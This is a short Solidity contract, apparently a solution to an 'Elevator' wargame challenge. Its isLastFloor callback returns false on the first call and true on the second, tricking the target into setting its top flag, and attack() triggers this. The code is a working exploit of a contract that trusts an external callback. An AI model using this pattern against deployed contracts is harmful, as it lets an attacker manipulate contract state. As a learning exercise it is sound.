// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'interfaces/elevatorInterface.sol';

contract ElevatorAttack {
    ElevatorInterface elevator;

    constructor(address _address) public {
        elevator = ElevatorInterface(_address);
    }

    function isLastFloor(uint) public returns (bool) {
        if (elevator.floor() == 0) {
            return false;
        } else {
            return true;
        }
    }

    function attack(uint x) public {
        elevator.goTo(x);
    }
}